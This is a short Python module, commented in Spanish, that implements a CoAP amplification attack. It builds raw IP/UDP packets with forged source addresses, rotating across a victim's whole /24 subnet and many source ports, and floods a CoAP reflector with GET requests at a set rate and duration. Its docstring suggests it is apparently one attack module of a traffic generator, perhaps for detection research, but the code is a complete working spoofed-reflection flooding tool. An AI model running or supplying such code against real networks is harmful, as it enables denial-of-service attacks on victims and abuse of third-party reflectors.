"""CoAP amplification — fuente spoofed, GET CON al reflector CoAP.

Rota IP víctima sobre su /24 y source port → cientos de flujos
COAP_AMPLIFICATION distintos en vez de 1 colapsado (ver dns_amplification).
"""

from __future__ import annotations

import socket
import struct
import time

N_VICTIMS = 254
N_SPORTS = 64
BASE_SPORT = 40000


def run(cfg: dict) -> int:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except OSError:
        print("[!] CoAP amplification requiere root + raw socket")
        return 1

    refl_ip = cfg["reflector_ip"]
    refl_port = cfg["reflector_port"]
    victims = _victim_pool(cfg["victim_ip"], int(cfg.get("victims", N_VICTIMS)))
    n_sports = int(cfg.get("src_ports", N_SPORTS))
    duration = cfg["duration_s"]
    rate = cfg.get("rate_pps", 1000)
    period = 1.0 / max(rate, 1.0)
    end = time.time() + duration

    coap_req = bytes([0x40, 0x01, 0x12, 0x34])  # CON GET
    coap_req += bytes([0xB1]) + b"."  # uri-path "."
    nv, i = len(victims), 0
    while time.time() < end:
        victim_ip = victims[i % nv]
        sport = BASE_SPORT + (i % n_sports)
        i += 1
        ip_pkt = _ip(victim_ip, refl_ip, len(coap_req) + 8)
        udp_pkt = _udp(sport, refl_port, coap_req)
        try:
            sock.sendto(ip_pkt + udp_pkt, (refl_ip, refl_port))
        except OSError:
            pass
        time.sleep(period)
    return 0


def _victim_pool(base_ip: str, n: int) -> list[str]:
    a, b, c, _ = base_ip.split(".")
    return [f"{a}.{b}.{c}.{octet}" for octet in range(1, min(n, 254) + 1)]


def _ip(src: str, dst: str, payload_len: int) -> bytes:
    return struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 20 + payload_len, 1, 0, 64, socket.IPPROTO_UDP, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )


def _udp(sport: int, dport: int, data: bytes) -> bytes:
    return struct.pack("!HHHH", sport, dport, 8 + len(data), 0) + data
